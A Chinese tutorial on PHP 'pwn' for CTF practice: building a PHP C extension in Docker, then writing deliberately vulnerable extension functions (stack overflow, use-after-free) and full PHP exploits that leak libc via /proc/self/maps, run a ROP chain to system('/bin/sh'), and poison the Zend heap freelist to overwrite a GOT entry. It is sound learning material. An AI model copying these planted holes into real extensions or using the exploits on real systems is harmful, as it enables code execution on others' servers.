---
title: "从零开始的 PHP PWN 学习"
description: "从写一个 PHP 拓展开始，到越界读写、Zend 内存管理，最后拿一道 note 题完整走一遍利用。"
pubDate: 2026-04-02
category: pwn
tags: [php]
---

## 环境搭建
### Docker 环境
先写 Dockerfile：
```bash
FROM php:8.1-apache

RUN apt update && \
    apt install -y build-essential vim

EXPOSE 80
```

构建镜像：
```bash
docker build -t php81-apache .
```

挂载源码目录：
```bash
docker run -it \
-d \
-v ./Dev:/workspace \
-v ./Src:/var/www/html \
-p 1724:80 \
-w /workspace \
--name php81 \
--hostname php81 \
php81-apache
```

### 启动容器
```bash
docker start php81-apache
docker exec -it php81-apache bash
```

## 编写 PHP 拓展
### 解压源码
```bash
cd /usr/src
tar -xvf ./php.tar.xz
```

### 生成模板
```bash
cd php-8.1.34/ext

# 在 /workspace 生成了一个名为 apple 的拓展模板
./ext_skel.php --ext apple --dir /workspace/
```

### 改权限
```bash
cd /workspace/apple
chmod -R ugo+rw apple
```

### 编译安装
```bash
phpize
./configure
make
make install
```

`make install` 的回显里会打印安装目录，例如 `/usr/local/lib/php/extensions/no-debug-non-zts-20210902/`。
### 测试
```bash
cp /usr/local/etc/php/php.ini-development /usr/local/etc/php/php.ini
```

然后编辑 `php.ini`，在末尾加上
```
extension=apple.so
```

在容器的 /var/www/html ，创建一个 index.php，内容是
```php
<?php
  phpinfo();
?>
```
然后访问，发现页面中有 apple 部分的信息

## 参数解析与返回值

### 参数解析
由于 C 和 PHP 的类型不同，编写拓展时，需要先解析参数。ZEND_PARSE_PARAMETERS_START 和 ZEND_PARSE_PARAMETERS_END 是参数解析的核心。Z_PARAM_XXX 系列宏用于指定参数类型。

类型解析如下
| 类型 | 宏 | 说明 |
| --- | --- | --- |
| long | Z_PARAM_LONG | 整数 |
| double | Z_PARAM_DOUBLE | 浮点数 |
| string | Z_PARAM_STRING | 字符串，需要手动释放内存 |
| string | (copy)	Z_PARAM_STR | 字符串，自动拷贝，不需要手动释放内存 |
| bool | Z_PARAM_BOOL | 布尔值 |
| array | Z_PARAM_ARRAY | 数组 |
| object | Z_PARAM_OBJECT | 对象 |
| resource | Z_PARAM_RESOURCE | 资源 |
| null | Z_PARAM_NULL | NULL 值 |
| is_null | Z_PARAM_ZVAL | 任意类型，需要使用 Z_ISNULL 宏判断是否为 NULL |

例如：
```
PHP_FUNCTION(my_function)
{
    zend_long a;
    double b;
    char *str;
    size_t str_len;

    ZEND_PARSE_PARAMETERS_START(2, 3)
        Z_PARAM_LONG(a)
        Z_PARAM_DOUBLE(b)
        Z_PARAM_OPTIONAL
        Z_PARAM_STRING(str, str_len)
    ZEND_PARSE_PARAMETERS_END();

    // ... 使用 a, b, str ...

    efree(str); // 释放字符串内存
}
```
`ZEND_PARSE_PARAMETERS_START(2, 3)` 里的两个数字是必填参数个数的下限和上限。
`Z_PARAM_OPTIONAL` 表示从这行起，后面的参数都是可选的。

### 返回值

`RETURN_XXX` 系列宏用于返回不同类型的值。

| 类型 | 宏 | 说明 |
| --- | --- | --- |
| long | RETURN_LONG | 整数 |
| double | RETURN_DOUBLE | 浮点数 |
| string | RETURN_STRING | 字符串，需要手动拷贝字符串 |
| string | (copy)	RETURN_STR | 字符串，自动拷贝，不需要手动释放内存 |
| bool | RETURN_TRUE, RETURN_FALSE | 布尔值 |
| array | RETURN_ARR | 数组，返回的是 zend_array * 指针，需要先创建 zend_array 结构体 |
| object | RETURN_OBJ | 对象，返回的是 zend_object * 指针，需要先创建 zend_object 结构体 |
| resource | RETURN_RES | 资源，返回的是 zend_resource * 指针，需要先创建 zend_resource 结构体 |
| null | RETURN_NULL | NULL 值 |
| void | RETURN_VOID | 没有返回值 |

### 实现 Recall 函数
修改 apple.stub.php ，声明函数
```php
...
function Recall(string $str = ""): void {}
...
```

然后运行 `php /usr/src/php-8.1.34/build/gen_stub.php --ext=apple ./apple.stub.php`
这一步会在 apple_arginfo.h 添加一些函数声明的内容。

找到源码 apple.c ，开始添加内容
```C
...
PHP_FUNCTION(Recall)
{
    char *str = NULL;
    size_t str_len = 0;

    ZEND_PARSE_PARAMETERS_START(1, 1)
           Z_PARAM_STRING(str, str_len)
    ZEND_PARSE_PARAMETERS_END();

    if (str) {
           php_printf("You say: %s", str);
    }
}

...
```

然后加点 info 信息，这部分的内容修改可以通过调用 phpinfo() 看到。
```C
PHP_MINFO_FUNCTION(apple)
{
    php_info_print_table_start();
    php_info_print_table_header(2, "apple support", "enabled");
    php_info_print_table_row(2,"author", "key");    // 添加的内容
    php_info_print_table_end();
}
```

修改之后重新编译安装一遍就好，记得重启下 docker
在 docker 内
```bash
make
make install
```
然后在宿主机
```bash
docker restart php81
```

### 验证

#### 看 phpinfo
`./Src` 挂载的就是容器的 `/var/www/html`，前面建好的 `index.php` 直接刷新即可。浏览器访问 **http://ip:1724/index.php** ，就能看到 phpinfo() 的执行效果，查看到 apple 部分有 author 字段及内容。ip 请根据实际做对应调整。

#### 调 Recall
在 ./Src 文件夹下创建文件 test.php ，写如下内容
```php
<?php
  Recall("Do you like apple?\n");
?>
```

来到容器中，cd /var/www/html ，直接运行 test.php
```
php test.php
```
看到回显为：`You say: Do you like apple?` ，就是验证成功。

## 漏洞研究
实际比赛就是先得到有漏洞的 .so 文件（有时可能题目附件直接提供），然后分析。
由于是本地探究，就自己直接写源码，下面不给出完整生成安装过程，生成安装和前面的步骤是一致的。

### 读 libc 地址
libc 地址获取是比较简单的，直接读取 `/proc/self/maps` 就好
```php
$filename = "/proc/self/maps";
$searchTerm = "libc.so.6";
$found = false;

$handle = fopen($filename, "r");

if ($handle) {
    $lineNumber = 1;
    while (($line = fgets($handle)) !== false) {
        if (strpos($line, $searchTerm) !== false) {
            $found = true;
            break;
        }
        $lineNumber++;
    }
    fclose($handle);
}

sscanf($line, "%x", $addr);

echo "Libc Address: 0x" . dechex($addr) . PHP_EOL;
```

### 栈：越界读写
定义两个拓展函数
```php
function GetThing(int $offset): int {}
function WriteThing(string $str): void {}
```
具体实现，
configure 生成的 Makefile 需要删去 *-O2* 优化，否则会加上 FORTIFY 保护，导致 `memcpy` 函数加上长度检查变为 `__memcpy_chk` 函数：
```C
PHP_FUNCTION(GetThing)
{
    zend_long offset;
    zend_long result;

    ZEND_PARSE_PARAMETERS_START(1, 1)
        Z_PARAM_LONG(offset)
    ZEND_PARSE_PARAMETERS_END();

    void *target = (void *)&offset;

    if (target != NULL) {
        memcpy(&result, target+offset, sizeof(result));
    }

    RETURN_LONG(result);
}

PHP_FUNCTION(WriteThing)
{
    char buf[0x20];
    char* input_str;
    size_t input_len;

    ZEND_PARSE_PARAMETERS_START(1, 1)
        Z_PARAM_STRING(input_str, input_len)
    ZEND_PARSE_PARAMETERS_END();

    memcpy(buf, input_str, input_len);
}
```
所以这是一个任意地址读写（越界读 + 越界写），后面按常规 ROP 打即可。

#### exp
```php
<?php

$filename = "/proc/self/maps";
$searchTerm = "libc.so.6";
$found = false;

$handle = fopen($filename, "r");

if ($handle) {
    $lineNumber = 1;
    while (($line = fgets($handle)) !== false) {
        if (strpos($line, $searchTerm) !== false) {
            $found = true;
            break;
        }
        $lineNumber++;
    }
    fclose($handle);
}

sscanf($line, "%x", $addr);

echo "Libc Address: 0x" . dechex($addr) . PHP_EOL;

$rdi = $addr + 0x2a145;
echo "pop rdi: 0x" . dechex($rdi) . PHP_EOL;
$binsh = $addr + 0x1A7EA4;
echo "binsh: 0x" . dechex($binsh) . PHP_EOL;
$system = $addr + 0x53110;
echo "system: 0x" . dechex($system) . PHP_EOL;

$data = [
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    $rdi+1,
    $rdi,
    $binsh,
    $system
];

$bin = pack("Q*", ...$data);

WriteThing($bin);

?>
```

### 堆：Zend 的内存管理
PHP 的内存管理走 Zend 引擎自己的 `emalloc` / `efree`，不是 glibc 那套 `malloc` / `calloc` / `free`。不同于 glibc 的各种大小的 chunk，zend 引擎的内存管理只有有三种情况：
| size | name | 机制 |
| --- | --- | --- |
| size > 2mb - 4kb | huge | 直接调用操作系统的 malloc（或类似接口）进行分配 |
| 3kb < size <= 2mb - 4kb | large | 按页分配 |
| size <= 3kb(3072) | small | 小内存会被分配到特定的 Slot（槽位）中。ZMM 预设了 30 多个不同大小的 Bin（例如 8, 16, 24, ... 3072 字节）。 |

攻击一般落在 small 上，这里也只讨论 small：机制和 tcache 类似，都是后进先出的单链表。
```C
ptr1 = emalloc(0x60);
ptr2 = emalloc(0x60);

efree(ptr2);
efree(ptr1);

ptr3 = emalloc(0x60);
ptr4 = emalloc(0x60);
```
最后 ptr3 和 ptr1 的值一样，ptr4 和 ptr2 一样。`efree` 之后会形成 **ptr1 → ptr2** 的链表，改掉 ptr1 的内容就能劫持它。

### 例题：note

定义增删改查的函数
```php
function GetNote(int $idx, int $size): void {}
function ThrowNote(int $idx): void {}
function ViewNote(int $idx): string {}
function EditNote(int $idx, string $content): void {}
```
然后实现
```C
struct Note {
    int size;
    void* content;
};

struct Note notes[0x10] = {0};

PHP_FUNCTION(GetNote)
{
    zend_long idx;
    zend_long size;

    ZEND_PARSE_PARAMETERS_START(2, 2)
           Z_PARAM_LONG(idx)
           Z_PARAM_LONG(size)
    ZEND_PARSE_PARAMETERS_END();

    if(idx < 0 || idx >= 0x10) {
           php_printf("Idx should be between 1 and 15");
           RETURN_FALSE;
    }

    notes[idx].size = size;
    notes[idx].content = emalloc(size);
}

PHP_FUNCTION(ThrowNote)
{
    zend_long idx;

    ZEND_PARSE_PARAMETERS_START(1, 1)
           Z_PARAM_LONG(idx)
    ZEND_PARSE_PARAMETERS_END();

    if(idx < 0 || idx >= 0x10) {
           php_printf("Idx should be between 1 and 15");
           RETURN_FALSE;
    }

    if(notes[idx].content == NULL) {
           RETURN_FALSE;
    }

    efree(notes[idx].content);
}

PHP_FUNCTION(ViewNote)
{
    zend_long idx;

    ZEND_PARSE_PARAMETERS_START(1, 1)
           Z_PARAM_LONG(idx)
    ZEND_PARSE_PARAMETERS_END();

    if(idx < 0 || idx >= 0x10) {
           php_printf("Idx should be between 1 and 15");
           RETURN_FALSE;
    }

    if(notes[idx].content == NULL) {
           RETURN_EMPTY_STRING();
    }

    RETURN_STRINGL(notes[idx].content, notes[idx].size);
}

PHP_FUNCTION(EditNote)
{
    zend_long idx;
    char *new_content;
    size_t new_content_len;

    ZEND_PARSE_PARAMETERS_START(2, 2)
        Z_PARAM_LONG(idx)
        Z_PARAM_STRING(new_content, new_content_len)
    ZEND_PARSE_PARAMETERS_END();

    if(idx < 0 || idx >= 0x10) {
           php_printf("Idx should be between 1 and 15");
           RETURN_FALSE;
    }

    if(notes[idx].content == NULL) {
           RETURN_FALSE;
    }

    if (new_content_len >= notes[idx].size) {
           RETURN_FALSE;
    }

    memcpy(notes[idx].content, new_content, new_content_len);
}
```
这是一个比较明显的 UAF：`efree` 之后没有把 `content` 置空，`EditNote` 仍然能写进去。拓展的 GOT 可写，所以直接打 GOT。

#### exp
```php
<?php

$filename = "/proc/self/maps";
$searchTerm1 = "libc.so.6";
$searchTerm2 = "apple.so";
$found1 = false;
$found2 = false;
$line1 = -1;
$line2 = -1;

$handle = fopen($filename, "r");

if ($handle) {
    while (($line = fgets($handle)) !== false) {
        if (!$found1 &&strpos($line, $searchTerm1) !== false) {
            $found1 = true;
            $line1 = $line;
        }
        if (!$found2 && strpos($line, $searchTerm2) !== false) {
            $found2 = true;
            $line2 = $line;
        }
        if ($found1 && $found2){
            break;
        }
    }
    fclose($handle);
}

sscanf($line1, "%x", $addr1);
sscanf($line2, "%x", $addr2);

echo "Libc Address: 0x" . dechex($addr1) . PHP_EOL;
echo "Apple Address: 0x" . dechex($addr2) . PHP_EOL;

GetNote(0, 0x60);
GetNote(1, 0x60);
GetNote(2, 0x100);
GetNote(3, 0x100);
GetNote(4, 0x30);

EditNote(4, "/bin/sh");

ThrowNote(0);
ThrowNote(1);

$data = [
    $addr2 + 0x5050
];
$payload = pack("Q*",...$data);

EditNote(1, $payload);

GetNote(0, 0x60);
GetNote(1, 0x60);

$data = [
    $addr1 + 0x53110
];
$payload = pack("Q*",...$data);
EditNote(1, $payload);

ThrowNote(4);
?>
```

## 参考文献

- [PHP pwn 学习 (1)](https://hornos3.github.io/2024/06/19/PHP-pwn-%E5%AD%A6%E4%B9%A0-1/)
- [[原创]php pwn 分析与 phpgdb 插件](https://bbs.kanxue.com/thread-286446.htm)
- [PHP `Extension` 开发：用 C 语言扩展 PHP 功能与性能优化](https://www.zyxy.net/archives/12582)
